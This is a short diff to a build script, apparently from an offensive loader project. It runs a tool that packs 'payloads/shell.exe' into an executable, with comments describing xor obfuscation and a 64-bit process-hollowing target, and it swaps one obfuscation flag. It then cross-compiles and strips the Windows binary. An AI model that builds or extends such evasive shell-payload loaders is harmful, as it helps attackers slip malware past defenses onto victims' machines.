@@ -9,7 +9,7 @@ echo "" > defs.h
 # call make_bfg, compile payload into executable
 # set -x flag to use xor obfuscation
 # -X flag specifies 64 bit hollowing target
-./make_bfg -H payloads/shell.exe -x -X
+./make_bfg -H payloads/shell.exe -a -X
 # compile 
 $win64_compiler -o bfg.exe bfg.c 
 strip bfg.exe
